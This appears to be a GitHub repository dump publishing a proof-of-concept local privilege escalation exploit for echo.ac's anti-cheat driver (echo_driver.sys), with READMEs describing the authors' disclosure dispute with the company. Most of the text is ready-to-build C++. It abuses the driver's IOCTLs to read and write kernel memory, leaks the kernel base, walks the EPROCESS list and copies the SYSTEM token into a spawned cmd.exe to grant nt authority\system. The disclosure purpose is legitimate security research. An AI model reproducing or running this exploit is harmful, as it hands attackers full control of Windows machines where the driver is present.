Project Path: arc_gmh5225_echoac-poc_9f2c274l

Source Tree:

```txt
arc_gmh5225_echoac-poc_9f2c274l
â”œâ”€â”€ LICENSE
â”œâ”€â”€ PoC
â”‚   â”œâ”€â”€ PrivilegeEscalation
â”‚   â”‚   â”œâ”€â”€ CMakeLists.txt
â”‚   â”‚   â”œâ”€â”€ DriverInterface.h
â”‚   â”‚   â”œâ”€â”€ DriverTypes.h
â”‚   â”‚   â””â”€â”€ main.cpp
â”‚   â””â”€â”€ README.md
â””â”€â”€ README.md

```

`LICENSE`:

```
MIT License

Copyright (c) 2023 protocol, kite03

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`PoC/PrivilegeEscalation/CMakeLists.txt`:

```txt
cmake_minimum_required(VERSION 3.25)
project(EchoACPoC)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_GENERATOR_PLATFORM x64)

add_executable(EchoACPoC main.cpp DriverInterface.h DriverTypes.h)

```

`PoC/PrivilegeEscalation/DriverInterface.h`:

```h
#include <iostream>
#include "DriverTypes.h"

class DriverInterface {
public:
    HANDLE hDevice;

    // On instantiation, get a handle to the driver and execute our first IOCTL call.
    DriverInterface() {
        hDevice = CreateFileA(
                "\\\\.\\EchoDrv",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                NULL,
                NULL
        );

        //If driver handle failed to open print message and return
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cout << "Invalid handle on CreateFileA!" << std::endl;
            //Get the last error from windows for CreateFile
            std::cout << "Error code: " << GetLastError() << std::endl;
        }

        // Yes, this buffer seems useless - but without it the driver BSOD's the PC.
        //Create a buffer to have data returned to.
        void* buf = (void*)malloc(4096);

        //Call IOCTL that sets the PID variable and gets past the DWORD check
        //0x9e6a0594 - IOCTL Code
        BOOL success = DeviceIoControl(hDevice, 0x9e6a0594, NULL, NULL, buf, 4096, NULL, NULL);
        if (!success) {
            std::cout << "DeviceIOControl 0x9e6a0594 failed!" << std::endl;
            std::cout << "Error code: " << GetLastError() << std::endl;

            CloseHandle(hDevice);
            return;
        }

        //We don't need that buffer anymore
        free(buf);
    }

    ~DriverInterface() {
        CloseHandle(hDevice);
    }

    // Next, get a HANDLE to the desired process through the driver.
    HANDLE get_handle_for_pid(DWORD pid) {
        // IOCTL Code - 0xe6224248

        k_get_handle param{};
        // Process ID to get handle for
        param.pid = pid;

        // Access to be granted on the returned handle
        param.access = GENERIC_ALL;

        // Do DeviceIoControl call
        BOOL success = DeviceIoControl(hDevice, 0xe6224248, &param, sizeof(param), &param, sizeof(param), NULL, NULL);
        if (!success) {
            std::cout << "DeviceIOControl 0xe6224248 failed!" << std::endl;
            std::cout << "Error code: " << GetLastError() << std::endl;
            return INVALID_HANDLE_VALUE;
        }

        // Return the handle given by the driver.
        return param.handle;
    }

    // A simple function to read memory using the driver.
    BOOL read_memory_raw(void* address, void* buf, size_t len, HANDLE targetProcess) {
        k_param_readmem req{};
        req.fromAddress = (void*)address;
        req.length = len;
        req.targetProcess = targetProcess;
        req.toAddress = (void*)buf;

        BOOL success = DeviceIoControl(hDevice, 0x60a26124, &req, sizeof(k_param_readmem), &req, sizeof(k_param_readmem), NULL, NULL);
        return success;
    }

    void Shutdown() {
        CloseHandle(hDevice);
   }
};
```

`PoC/PrivilegeEscalation/DriverTypes.h`:

```h
#pragma once
#include <Windows.h>
#include <cstdint>
#include <winternl.h>

struct k_param_readmem {
    HANDLE targetProcess;
    void* fromAddress;
    void* toAddress;
    size_t length;
    void* padding;
    uint32_t returnCode;
};

struct k_param_init {
    void* first;
    void* second;
    void* third;
};

struct k_get_handle {
    DWORD pid;
    ACCESS_MASK access;
    HANDLE handle;
};

// This is a windows type to fetch NtQuerySystemInformation
// These structures are copied from Process Hacker source code (ntldr.h)
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef struct _SYSTEM_HANDLE
{
    PVOID Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR HandleCount;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
```

`PoC/PrivilegeEscalation/main.cpp`:

```cpp
/*
 * I strongly recommend also reading the associated writeup for more details about the exploit and company. Thanks!
 * https://ioctl.fail/echo-ac-writeup/
 */

#include "DriverInterface.h"

#pragma comment(lib, "ntdll.lib")

int main() {
    SetConsoleTitle("echo.ac PoC");
    std::cout << "[?] echo_driver.sys Privilege Escalation PoC demonstration." << std::endl;
    DriverInterface Driver; // Instantiate our driver
    HANDLE processHandle = Driver.get_handle_for_pid(GetCurrentProcessId()); // Fetch a HANDLE for our own program.

    NTSTATUS status; // Status variable
    PRTL_PROCESS_MODULES ModuleInfo; // Store modules
    uintptr_t ntoskrnlBaseAddress = NULL;   // Kernel base address

    // Leak ntoskrnl base address using NtQuerySystemInformation
    ModuleInfo = (PRTL_PROCESS_MODULES) VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!ModuleInfo) {
        printf("[!] Error allocating module memory! Error Code: %lu", GetLastError());
        Driver.Shutdown();
        return -1;
    }

    // Call NtQuerySystemInformation and ask for the System module list.
    if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) 11, ModuleInfo, 1024 * 1024,
                                                      NULL))) // 11 = SystemModuleInformation
    {
        printf("\n[!] Error: Unable to query module list (%#x)\n", status);

        VirtualFree(ModuleInfo, 0, MEM_RELEASE);
        Driver.Shutdown();
        return -1;
    }

    // Iterate through module list till we find the Kernel base address.
    // We do this by iterating through the list till we find a module named "ntoskrnl.exe" - this is the Kernel.
    for (int i = 0; i < ModuleInfo->NumberOfModules; i++) {
        if (!strcmp((const char *) ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName,
                    "ntoskrnl.exe")) {
            ntoskrnlBaseAddress = (uintptr_t) ModuleInfo->Modules[i].ImageBase;
            break;
        }
    }

    // Clear that buffer now we don't need it.
    VirtualFree(ModuleInfo, 0, MEM_RELEASE);

    std::cout << "[>] ntoskrnl.exe base address: " << std::hex << ntoskrnlBaseAddress << std::dec << std::endl;

    // These tokens will need updating if you are on a different version of Windows!
    // The offsets can be found here: https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm
    uintptr_t TokenOffset = 0x04B8; // Windows 10 21H2+ and Windows 11 only
    uintptr_t PIDOffset = 0x0440; // Windows 10 21H2+ and Windows 11 only
    uintptr_t ActiveProcessLinksOffset = 0x0448; // Windows 10 21H2+ and Windows 11 only

    // Fetch Kernel EPROCESS/KPROCESS
    // Get NTOS module address by loading it
    HMODULE ntos = LoadLibrary("ntoskrnl.exe");
    // Get function address
    auto PsInitialSystemProcessOffsetAddr = (uint64_t) GetProcAddress(ntos, "PsInitialSystemProcess");
    // Get offset
    auto offset = PsInitialSystemProcessOffsetAddr - (uint64_t) ntos;
    // Rebase to get Kernel address
    auto realPsInitialSystemProcessAddr = offset + ntoskrnlBaseAddress;
    // Read the EPROCESS pointer to get real address using our exploit
    uint64_t PsInitialSystemProcessEPROCESS;
    Driver.read_memory_raw(
            (void *) realPsInitialSystemProcessAddr,
            &PsInitialSystemProcessEPROCESS,
            sizeof(PsInitialSystemProcessEPROCESS),
            processHandle
    );

    std::cout << "[>] PsInitialSystemProcess EPROCESS Address: " << std::hex << PsInitialSystemProcessEPROCESS
              << std::dec << std::endl;

    // Read the PID of the System
    DWORD systemPID;
    Driver.read_memory_raw(
            (void *) (PsInitialSystemProcessEPROCESS + PIDOffset),
            &systemPID,
            sizeof(systemPID),
            processHandle
    );

    // This is usually always 4.
    std::cout << "[>] System PID: " << systemPID << std::endl;

    // Steal the System process token address using our exploit.
    uint64_t SystemToken;
    Driver.read_memory_raw(
            (void *) (PsInitialSystemProcessEPROCESS + TokenOffset),
            &SystemToken,
            sizeof(SystemToken),
            processHandle
    );
    std::cout << "[>] System Token: " << std::hex << SystemToken << std::dec << std::endl;

    // Spawn a new shell and save its PID. We will elevate this shell to nt authority\system.
    std::cout << "[-] Spawning a new shell that will be elevated to nt authority\\system!" << std::endl;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi;
    CreateProcess(
            R"(C:\Windows\system32\cmd.exe)",
            nullptr,
            nullptr,
            nullptr,
            TRUE,
            CREATE_NEW_CONSOLE,
            nullptr,
            "C:\\Windows",
            &si,
            &pi
    );

    // Save the PID for later.
    DWORD OurShellPID = pi.dwProcessId;

    std::cout << "[-] Our shell's PID: " << OurShellPID << std::endl;

    // Initiate our variables.
    LIST_ENTRY activeProcessLinkList;
    uint64_t NextProcessEPROCESSBlock = PsInitialSystemProcessEPROCESS;
    Driver.read_memory_raw(
            (void *) (PsInitialSystemProcessEPROCESS + ActiveProcessLinksOffset),
            &activeProcessLinkList,
            sizeof(activeProcessLinkList),
            processHandle
    );
    // You can fetch every single process' EPROCESS block from this original Kernel list, we iterate through it till we find our shell's PID.
    while (true) {
        DWORD processPID;
        NextProcessEPROCESSBlock = (uint64_t) activeProcessLinkList.Flink - ActiveProcessLinksOffset;
        // Fetch PID and compare it
        Driver.read_memory_raw(
                (void *)(NextProcessEPROCESSBlock + PIDOffset),
                &processPID,
                sizeof(processPID),
                processHandle
        );
        // std::cout << "Found PID: " << processPID << std::dec << " With EPROCESS Addr: " << std::hex << NextProcessEPROCESSBlock << std::dec << std::endl;
        if (processPID == OurShellPID) {
            std::cout << "[>] Found our shell's EPROCESS address: " << std::hex << NextProcessEPROCESSBlock << std::dec
                      << std::endl;
            uint64_t OurShellsToken;
            Driver.read_memory_raw(
                    (void *) (NextProcessEPROCESSBlock + TokenOffset),
                    &OurShellsToken,
                    sizeof(OurShellsToken),
                    processHandle
            );
            std::cout << "[>] Found our shell's current Process Token: " << std::hex << OurShellsToken << std::dec
                      << std::endl;
            // Overwrite our shell's Process Token with the System's Process Token, to elevate our privilege!
            Driver.read_memory_raw(
                    (void *) &SystemToken,
                    (void *) (NextProcessEPROCESSBlock + TokenOffset),
                    sizeof(SystemToken),
                    processHandle
            );
            break;
        }
        // Fetch next EPROCESS block, in case we didn't find it.
        Driver.read_memory_raw(
                (void *) (NextProcessEPROCESSBlock + ActiveProcessLinksOffset),
                &activeProcessLinkList,
                sizeof(activeProcessLinkList),
                processHandle
        );
    }

    // Done!
    std::cout << "[$] The newly opened shell should now be running as nt authority\\system!" << std::endl;

    // Close the handles.
    FreeLibrary(ntos);
    Driver.Shutdown();

    return 0;
}

```

`PoC/README.md`:

```md
# Example PoCs

# Download Driver
I have removed the driver binary from this repo for security. 

You may download the driver binary from the official loldrivers.io page, as well as read extra information about the driver file itself:
https://www.loldrivers.io/drivers/afb8bb46-1d13-407d-9866-1daa7c82ca63/

Driver SHA256 Hash: `ea3c5569405ed02ec24298534a983bcb5de113c18bc3fd01a4dd0b5839cd17b9`

## PrivilegeEscalation/
This PoC demonstrates a Privilege Escalation exploit, by stealing the Kernel's KPROCESS/EPROCESS block and writing it to a newly spawned shell to elevate its privileges to the highest possible - nt authority\system.

### **Important Note: Please build in Release mode! It appears to not execute correctly if built in Debug mode!**

It may be too technical for some to understand, but I have tried to comment it well.


Have fun! ðŸ’œ

```

`README.md`:

```md
![image-removebg-preview1](https://github.com/kite03/echoac-poc/assets/67329371/9c5c89ca-d0b4-443c-84a2-97f94fb85657)

## A PoC and writeup on vulnerabilties discovered in echo.ac's driver.

# ðŸ’• Credits

- Whanos: https://github.com/Whanos/ - Initial discovery, first contact with echo.ac, writing.
- Lemon (Wishes to stay anonymous) - Exploit development and assistance.
- kite03: https://github.com/kite03/ - Exploit development, and writing.

# Writeup Link
https://ioctl.fail/echo-ac-writeup/

# Driver Download
I have removed the binary from this repo for security.

You may read extra info and download the driver binary from the official loldrivers.io page: https://www.loldrivers.io/drivers/afb8bb46-1d13-407d-9866-1daa7c82ca63/

## Background
echo.ac is a commercial "screensharing tool", marketed and developed mostly for the Minecraft PvP community, but also used by some other game communities, such as Rust.
A "screensharing tool" is a program developed to "assist" server admins in identifying if someone's using cheats or similar banned external tools ingame - As such, these programs execute numerous intrusive scans on users computer, while being very vague of what they data collect and why.

When this point was brought up to them, they reacted aggressively and attacked us for criticising this practice. We think that it is unfair that users can be banned for not wanting to run this invasive software.

I (Whanos/protocol) also attempted to disclose this exploit to the CEO in private before disclosing it publicly, but they brushed me off and then banned me from their discord server.

To read our frankly, unprofessional experiences with the staff team of this company, and to see the company's appalling response to us disclosing this exploit to them, read https://ioctl.fail/echo-ac-writeup/.

Thanks for your time ðŸ’œ.

```